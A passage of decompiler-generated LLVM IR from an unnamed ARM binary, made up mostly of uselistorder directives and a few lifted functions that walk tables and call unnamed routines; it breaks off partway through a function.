  uselistorder i32 %v3_86c0, { 1, 0, 2 }
  uselistorder i1 %v7_861c, { 1, 0 }
  uselistorder i32 %v3_8618, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_85f4, { 1, 0 }
  uselistorder i32 %v4_85cc, { 2, 1, 0 }
  uselistorder i8 %v3_85cc, { 11, 12, 13, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_85cc, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8870, { 4, 2, 3, 1, 0, 5 }
  uselistorder i1 %v7_8594, { 1, 0 }
  uselistorder i32 %v1_8594, { 1, 0 }
  uselistorder i1 %v7_858c, { 1, 0 }
  uselistorder i1 %v7_8584, { 1, 0 }
  uselistorder i1 %v7_857c, { 1, 0 }
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i1 %v7_8574, { 1, 0 }
  uselistorder i1 %v7_856c, { 1, 0 }
  uselistorder i32 %v1_8550, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_84f0, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i8* %v1_88b0, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_86d0, { 0, 15, 1, 2, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 22, 9, 23, 10, 13, 11, 14, 12, 24 }
  uselistorder i32 %v1_9e44, { 1, 0, 2 }
  uselistorder i32 %stack_var_-20860.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 63, 3, 68, 67, 4, 66, 65, 5, 62, 6, 79, 78, 7, 77, 76, 8, 75, 74, 9, 73, 72, 10, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 45, 17, 44, 43, 18, 42, 19, 41, 40, 20, 39, 38, 21, 37, 36, 22, 35, 34, 23, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20864.0.ph, { 1, 0 }
  uselistorder i32 %v3_84cc, { 1, 0 }
  uselistorder i32 %v0_84cc, { 1, 0, 2 }
  uselistorder i32 %v2_8498, { 1, 0, 2, 3 }
  uselistorder i32 %v3_848c, { 1, 0, 2 }
  uselistorder i32 %v0_8480, { 1, 0 }
  uselistorder i32 %v5_8478, { 1, 0 }
  uselistorder i32 %v0_8444, { 1, 2, 0, 3 }
  uselistorder i32 %v0_83cc, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v2_83b4, { 1, 0 }
  uselistorder i32 %v5_83b0, { 1, 0 }
  uselistorder i32 %v2_8370, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_835c, { 4, 5, 19, 15, 16, 17, 2, 3, 18, 0, 1, 14, 10, 11, 12, 13, 20, 8, 9, 7, 6 }
  uselistorder i32 %v0_8350, { 0, 1, 3, 2 }
  uselistorder i1 %v2_82e0, { 1, 0, 2 }
  uselistorder i32* %v11_82b4, { 2, 0, 1, 3 }
  uselistorder i32 %v10_82b0, { 21, 20, 19, 11, 10, 17, 16, 15, 18, 14, 13, 32, 31, 30, 28, 27, 29, 26, 25, 12, 23, 22, 9, 8, 7, 24, 6, 38, 37, 36, 34, 35, 33, 43, 42, 41, 40, 39, 5, 4, 3, 2, 1, 0, 44, 45 }
  uselistorder i32 %v2_82a8, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_8298, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_8288, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_8260, { 1, 0, 2 }
  uselistorder i8* %tmp168, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_823c, { 0, 28, 32, 33, 34, 35, 1, 30, 2, 3, 31, 36, 17, 18, 4, 27, 5, 6, 29, 37, 7, 26, 8, 9, 38, 10, 11, 24, 25, 39, 12, 21, 13, 22, 23, 40, 14, 15, 19, 20, 41, 42, 43, 16, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 %v5_8234, { 1, 0 }
  uselistorder i32 %v6_81bc, { 3, 2, 4, 0, 8, 7, 6, 1, 5, 9 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 42, 40, 41 }
  uselistorder i32* %sb.global-to-local, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 27, 28, 20, 21, 22, 23, 26, 24, 25, 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 29, 30 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 7, 4, 5, 6, 8, 11, 9, 10, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 1, 11, 12, 14, 13, 15, 16, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 17, 18, 19, 20, 21, 22, 77, 23, 24, 26, 27, 28, 30, 29, 31, 32, 33, 34, 35, 25, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 142, 143, 144, 145, 94, 97, 98, 99, 100, 101, 102, 106, 107, 103, 104, 105, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 119, 118, 96, 121, 122, 120, 95, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 118, 119, 120, 121, 122, 123, 124, 125, 126, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 115, 116, 117, 76, 79, 80, 81, 82, 84, 85, 83, 86, 87, 89, 88, 90, 91, 92, 93, 94, 95, 96, 97, 78, 98, 99, 77, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 43, 25, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 45, 48, 46, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 154, 155, 156, 157, 158, 159, 160, 161, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122, 121, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 153, 152, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 4, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 26, 17, 16, 18, 214, 27, 208, 215, 66, 37, 28, 30, 29, 31, 33, 32, 35, 34, 38, 36, 39, 41, 40, 42, 44, 43, 46, 45, 50, 47, 48, 49, 51, 52, 54, 53, 56, 55, 57, 58, 59, 61, 60, 62, 63, 64, 67, 65, 69, 68, 70, 72, 71, 73, 76, 74, 75, 78, 77, 82, 79, 80, 81, 83, 85, 84, 87, 86, 328, 89, 329, 88, 330, 331, 2, 333, 332, 334, 335, 336, 1, 90, 337, 339, 338, 340, 91, 341, 342, 343, 344, 93, 92, 95, 94, 96, 98, 97, 99, 101, 100, 103, 102, 104, 106, 105, 107, 110, 108, 109, 112, 111, 114, 113, 115, 117, 116, 118, 120, 119, 122, 121, 123, 125, 124, 327, 126, 128, 127, 130, 129, 132, 131, 135, 133, 134, 137, 136, 138, 140, 139, 141, 144, 142, 143, 146, 145, 148, 147, 149, 151, 150, 152, 154, 153, 155, 156, 157, 159, 158, 161, 160, 162, 164, 163, 165, 167, 166, 168, 169, 170, 172, 171, 174, 173, 175, 177, 176, 178, 180, 179, 181, 183, 182, 184, 185, 187, 186, 189, 188, 192, 190, 191, 195, 193, 194, 198, 196, 197, 199, 201, 200, 202, 204, 203, 206, 205, 207, 209, 210, 212, 211, 217, 213, 216, 345, 218, 219, 221, 220, 222, 223, 224, 225, 226, 227, 228, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 266, 265, 267, 268, 23, 269, 22, 270, 272, 271, 21, 274, 273, 20, 275, 276, 277, 241, 280, 278, 279, 281, 3, 282, 19, 283, 284, 24, 285, 25, 286, 287, 289, 288, 291, 290, 292, 293, 294, 296, 295, 297, 298, 300, 299, 302, 301, 304, 303, 306, 305, 308, 307, 309, 310, 311, 312, 313, 314, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 47, 48, 49, 50, 51, 52, 53, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 45, 46, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32* %fp.global-to-local, { 0, 34, 1, 3, 2, 25, 4, 5, 6, 28, 27, 31, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 29, 30, 32, 33, 35, 36 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 89, 82, 83, 84, 85, 86, 87, 88, 90, 91, 92, 93, 94, 95, 96, 97, 98, 140, 141, 99, 100, 101, 102, 103, 108, 110, 109, 104, 105, 106, 107, 111, 112, 113, 114, 115, 116, 124, 125, 117, 118, 119, 120, 121, 122, 123, 126, 0, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30, 31, 32, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 50, 51, 49, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 94, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 151, 152, 153, 105, 106, 107, 112, 114, 113, 108, 109, 110, 111, 115, 116, 117, 118, 119, 120, 121, 122, 130, 131, 123, 124, 125, 126, 127, 128, 129, 132, 0, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150 }
  uselistorder i32 49, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 51, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 50, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_159f8.46 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_159e8.42 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_159e0.40 to i32), { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_159d4.38 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 -20773, { 1, 0, 2, 4, 3, 8, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_159dc.36 to i32), { 2, 4, 3, 5, 1, 6, 0, 7 }
  uselistorder i32 (i32, i32, i32, i32)* @function_f9f4, { 19, 18, 17, 0, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 2116, { 1, 2, 0 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), { 9, 16, 10, 17, 11, 18, 12, 19, 13, 20, 14, 21, 0, 22, 15, 23, 1, 24, 2, 25, 3, 26, 4, 27, 5, 28, 6, 29, 7, 30, 8, 31 }
  uselistorder i32 -1452, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i8 7, { 2, 3, 0, 1 }
  uselistorder i32 1452, { 1, 0 }
  uselistorder i32 789, { 2, 0, 1, 3 }
  uselistorder i32 1431, { 1, 2, 0, 3 }
  uselistorder i32 533, { 1, 0, 3, 2, 4 }
  uselistorder i32 3140, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 127, { 4, 2, 5, 0, 6, 1, 7, 3, 8 }
  uselistorder i32 126, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_159bc.17 to i32), { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg4, { 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_9e04, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_9cc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9ca8, { 2, 0, 1 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %dec_label_pc_9a74, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %dec_label_pc_9a48, { 2, 0, 1 }
  uselistorder label %.thread41, { 1, 0 }
  uselistorder label %dec_label_pc_99ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_98f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_98d8, { 5, 0, 1, 6, 2, 3, 4 }
  uselistorder label %dec_label_pc_988c, { 1, 0 }
  uselistorder label %dec_label_pc_9864, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9858, { 1, 0 }
  uselistorder label %.thread37, { 1, 0 }
  uselistorder label %bb203, { 1, 0 }
  uselistorder label %dec_label_pc_9614, { 6, 1, 2, 7, 3, 4, 0, 5 }
  uselistorder label %bb201, { 1, 0 }
  uselistorder label %dec_label_pc_9510, { 0, 2, 1 }
  uselistorder label %dec_label_pc_9464, { 1, 0 }
  uselistorder label %dec_label_pc_945c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9434, { 1, 0 }
  uselistorder label %dec_label_pc_93f8, { 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %bb195, { 1, 0 }
  uselistorder label %bb193, { 1, 0 }
  uselistorder label %dec_label_pc_930c, { 2, 1, 0 }
  uselistorder label %bb191, { 1, 0 }
  uselistorder label %.thread26, { 3, 0, 1, 2 }
  uselistorder label %bb188, { 1, 0 }
  uselistorder label %.thread25, { 3, 0, 1, 2 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %.thread24, { 1, 0 }
  uselistorder label %.thread23, { 1, 0 }
  uselistorder label %dec_label_pc_9040, { 1, 0 }
  uselistorder label %dec_label_pc_8ef8, { 1, 0 }
  uselistorder label %dec_label_pc_8dc8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8da0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d34, { 1, 2, 0 }
  uselistorder label %bb180, { 1, 0 }
  uselistorder label %dec_label_pc_8c44, { 1, 0 }
  uselistorder label %dec_label_pc_8c2c, { 1, 0 }
  uselistorder label %dec_label_pc_8bf0, { 1, 0 }
  uselistorder label %dec_label_pc_8b7c, { 1, 0 }
  uselistorder label %dec_label_pc_8b44, { 1, 0 }
  uselistorder label %dec_label_pc_887c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_87ac, { 7, 8, 15, 16, 9, 1, 10, 11, 2, 12, 13, 3, 14, 0, 6, 4, 5 }
  uselistorder label %dec_label_pc_8774, { 1, 0 }
  uselistorder label %dec_label_pc_85b4, { 5, 0, 1, 2, 6, 3, 4, 7 }
  uselistorder label %dec_label_pc_8530.dec_label_pc_8530_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8508.dec_label_pc_8508_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_84ec, { 3, 0, 2, 1, 4 }
  uselistorder label %dec_label_pc_84ec.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8480, { 1, 0 }
  uselistorder label %dec_label_pc_8404, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb174, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %dec_label_pc_82bc, { 1, 0 }
  uselistorder label %dec_label_pc_8274, { 1, 3, 4, 0, 2 }
}

define i32 @function_9f20(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_9f20:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_9f20 = icmp eq i32 %arg1, 0
  br i1 %v2_9f20, label %dec_label_pc_9f68, label %dec_label_pc_9f30

dec_label_pc_9f30:                                ; preds = %dec_label_pc_9f20
  %v0_9f30 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f30 = add i32 %v0_9f30, 4
  %v2_9f30 = inttoptr i32 %v1_9f30 to i8*
  %v3_9f30 = load i8, i8* %v2_9f30, align 1
  %v4_9f30 = zext i8 %v3_9f30 to i32
  %v9_9f34 = icmp eq i32 %v4_9f30, %arg3
  br i1 %v9_9f34, label %dec_label_pc_9f74, label %dec_label_pc_9f58.preheader

dec_label_pc_9f58.preheader:                      ; preds = %dec_label_pc_9f30
  br label %dec_label_pc_9f58

dec_label_pc_9f48:                                ; preds = %dec_label_pc_9f58
  %v1_9f48 = add i32 %v0_9f50.in, 12
  %v2_9f48 = inttoptr i32 %v1_9f48 to i8*
  %v3_9f48 = load i8, i8* %v2_9f48, align 1
  %v4_9f48 = zext i8 %v3_9f48 to i32
  %v9_9f4c = icmp eq i32 %v4_9f48, %arg3
  br i1 %v9_9f4c, label %dec_label_pc_9f74, label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9f58.preheader, %dec_label_pc_9f48
  %v0_9f50.in = phi i32 [ %v0_9f30, %dec_label_pc_9f58.preheader ], [ %v0_9f50, %dec_label_pc_9f48 ]
  %v0_9f58 = phi i32 [ 0, %dec_label_pc_9f58.preheader ], [ %v1_9f58, %dec_label_pc_9f48 ]
  %v0_9f50 = add i32 %v0_9f50.in, 8
  %v1_9f58 = add i32 %v0_9f58, 1
  %v9_9f5c = icmp eq i32 %v1_9f58, %arg1
  store i32 %v0_9f50, i32* %r1.global-to-local, align 4
  br i1 %v9_9f5c, label %dec_label_pc_9f68, label %dec_label_pc_9f48

dec_label_pc_9f68:                                ; preds = %dec_label_pc_9f58, %dec_label_pc_9f20, %dec_label_pc_9f74
  %v0_9f68 = phi i32 [ %arg4, %dec_label_pc_9f20 ], [ %v2_9f74, %dec_label_pc_9f74 ], [ %arg4, %dec_label_pc_9f58 ]
  ret i32 %v0_9f68

dec_label_pc_9f74:                                ; preds = %dec_label_pc_9f48, %dec_label_pc_9f30
  %v0_9f74 = phi i32 [ %v0_9f30, %dec_label_pc_9f30 ], [ %v0_9f50, %dec_label_pc_9f48 ]
  %v1_9f74 = inttoptr i32 %v0_9f74 to i32*
  %v2_9f74 = load i32, i32* %v1_9f74, align 4
  br label %dec_label_pc_9f68

; uselistorder directives
  uselistorder i32 %v1_9f58, { 1, 0 }
  uselistorder i32 %v0_9f50, { 1, 0, 2 }
  uselistorder i32 %v0_9f50.in, { 1, 0 }
  uselistorder i32 %v0_9f30, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_9f58, { 1, 0 }
}

define i32 @function_9f7c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_9f7c:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_9f7c = load i32, i32* @r4, align 4
  store i32 %v3_9f7c, i32* %stack_var_-32, align 4
  %v6_9f7c = load i32, i32* @r5, align 4
  %v9_9f7c = load i32, i32* @r6, align 4
  %v12_9f7c = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  %v0_9f94 = call i32 @function_102c4()
  store i32 %v0_9f94, i32* @r0, align 4
  %v7_9f98 = icmp eq i32 %v0_9f94, -1
  %tmp23 = icmp slt i32 %v0_9f94, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_9f7c
  br label %dec_label_pc_9fb8

bb24:                                             ; preds = %dec_label_pc_9f7c
  %. = zext i1 %v7_9f98 to i32
  store i32 %., i32* @r5, align 4
  %v2_9fb0 = icmp eq i1 %v7_9f98, false
  br i1 %v2_9fb0, label %dec_label_pc_9fc0, label %dec_label_pc_9fb8

dec_label_pc_9fb8:                                ; preds = %.thread2, %bb24
  %v2_9fb8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_9fb8, i32* @r4, align 4
  store i32 %v6_9f7c, i32* @r5, align 4
  store i32 %v9_9f7c, i32* @r6, align 4
  store i32 %v12_9f7c, i32* @r7, align 4
  ret i32 %v0_9f94

dec_label_pc_9fc0:                                ; preds = %bb24
  %v0_9fc0 = call i32 @function_102c4()
  %v7_9fc4 = icmp eq i32 %v0_9fc0, -1
  store i32 %v0_9fc0, i32* @r4, align 4
  br i1 %v7_9fc4, label %dec_label_pc_9ff4, label %dec_label_pc_9fd0

dec_label_pc_9fd0:                                ; preds = %dec_label_pc_9fc0
  %v2_9fd0 = icmp eq i32 %v0_9fc0, 0
  br i1 %v2_9fd0, label %dec_label_pc_9fd8, label %dec_label_pc_9ffc

dec_label_pc_9fd8:                                ; preds = %dec_label_pc_9fd0
  %v0_9fd8 = load i32, i32* @r6, align 4
  %v1_9fdc = call i32 @function_126fc(i32 %v0_9fd8)
  store i32 %v1_9fdc, i32* @r0, align 4
  %v0_9fe0 = call i32 @function_10198()
  %v2_9fe8 = call i32 @function_103d4(i32 %v0_9fe0, i32 9)
  %v0_9fec = load i32, i32* @r4, align 4
  %v1_9ff0 = call i32 @function_12644(i32 %v0_9fec)
  br label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9fc0, %dec_label_pc_9fd8
  %v0_9ff4 = load i32, i32* @r5, align 4
  %v1_9ff8 = call i32 @function_12644(i32 %v0_9ff4)
  br label %dec_label_pc_9ffc

dec_label_pc_9ffc:                                ; preds = %dec_label_pc_9fd0, %dec_label_pc_9ff4
  %v2_a000 = load i8, i8* bitcast (i8** @global_var_1e5b0.51 to i8*), align 4
  %v3_a000 = zext i8 %v2_a000 to i32
  %v2_a004 = icmp eq i8 %v2_a000, 0
  br i1 %v2_a004, label %dec_label_pc_a048, label %dec_label_pc_a00c

dec_label_pc_a00c:                                ; preds = %dec_label_pc_9ffc
  %v2_a010 = load i32, i32* @global_var_1e5b4.53, align 4
  %v1_a014 = inttoptr i32 %v2_a010 to i32*
  %v2_a014 = load i32, i32* %v1_a014, align 4
  %v1_a018 = add i32 %v2_a014, 4
  %v2_a018 = inttoptr i32 %v1_a018 to i8*
  %v3_a018 = load i8, i8* %v2_a018, align 1
  %v4_a018 = zext i8 %v3_a018 to i32
  %v1_a01c = load i32, i32* @r7, align 4
  %v9_a01c = icmp eq i32 %v4_a018, %v1_a01c
  br i1 %v9_a01c, label %dec_label_pc_a050, label %dec_label_pc_a03c.preheader

dec_label_pc_a03c.preheader:                      ; preds = %dec_label_pc_a00c
  %v1_a020 = load i32, i32* @r5, align 4
  br label %dec_label_pc_a03c

dec_label_pc_a02c:                                ; preds = %dec_label_pc_a03c
  %v4_a02c = mul i32 %v1_a03c, 4
  %v5_a02c = add i32 %v4_a02c, %v2_a010
  %v6_a02c = inttoptr i32 %v5_a02c to i32*
  %v7_a02c = load i32, i32* %v6_a02c, align 4
  %v1_a030 = add i32 %v7_a02c, 4
  %v2_a030 = inttoptr i32 %v1_a030 to i8*
  %v3_a030 = load i8, i8* %v2_a030, align 1
  %v4_a030 = zext i8 %v3_a030 to i32
  %v9_a034 = icmp eq i32 %v4_a030, %v1_a01c
  br i1 %v9_a034, label %dec_label_pc_a050, label %dec_label_pc_a03c

dec_label_pc_a03c:                                ; preds = %dec_label_pc_a03c.preheader, %dec_label_pc_a02c
  %v0_a03c = phi i32 [ %v1_a020, %dec_label_pc_a03c.preheader ], [ %v1_a03c, %dec_label_pc_a02c ]
  %v1_a03c = add i32 %v0_a03c, 1
  %v9_a040 = icmp eq i32 %v1_a03c, %v3_a000
  br i1 %v9_a040, label %dec_label_pc_a048, label %dec_label_pc_a02c

dec_label_pc_a048:                                ; preds = %dec_label_pc_a03c, %dec_label_pc_9ffc, %dec_label_pc_a050
  %v1_a04c = call i32 @function_12644(i32 0)
  %v0_a060.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_a050

dec_label_pc_a050:                                ; preds = %dec_label_pc_a02c, %dec_label_pc_a00c, %dec_label_pc_a048
  %v0_a060 = phi i32 [ %v2_a014, %dec_label_pc_a00c ], [ %v0_a060.pre, %dec_label_pc_a048 ], [ %v7_a02c, %dec_label_pc_a02c ]
  %v1_a060 = inttoptr i32 %v0_a060 to i32*
  %v2_a060 = load i32, i32* %v1_a060, align 4
  call void @__pseudo_branch(i32 %v2_a060)
  br label %dec_label_pc_a048

; uselistorder directives
  uselistorder i32 %v1_a03c, { 2, 0, 1 }
  uselistorder i32 %v0_9fc0, { 1, 2, 0 }
  uselistorder i1 %v7_9f98, { 1, 0 }
  uselistorder i32 %v0_9f94, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a050, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a048, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a03c, { 1, 0 }
  uselistorder label %dec_label_pc_9ffc, { 1, 0 }
  uselistorder label %dec_label_pc_9ff4, { 1, 0 }
  uselistorder label %dec_label_pc_9fb8, { 1, 0 }
}

define i32 @function_a078(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_a078:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_a078 = load i32, i32* @r5, align 4
  %v9_a078 = load i32, i32* @r6, align 4
  %v12_a078 = load i32, i32* @r7, align 4
  %v18_a078 = load i32, i32* @sb, align 4
  %v21_a078 = load i32, i32* @sl, align 4
  %v24_a078 = load i32, i32* @fp, align 4
  %v2_a07c = icmp ugt i32 %arg2, 2
  %v7_a07c = icmp eq i32 %arg2, 3
  store i1 %v7_a07c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_a088 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a088, i32* @r5, align 4
  %v2_a08c = xor i1 %v7_a07c, true
  %v3_a08c = and i1 %v2_a07c, %v2_a08c
  br i1 %v3_a08c, label %dec_label_pc_a09c, label %dec_label_pc_a090

dec_label_pc_a090:                                ; preds = %dec_label_pc_a0dc, %.dec_label_pc_a090_crit_edge, %dec_label_pc_a0d0, %dec_label_pc_a0c0, %dec_label_pc_a09c, %dec_label_pc_a078, %dec_label_pc_a288
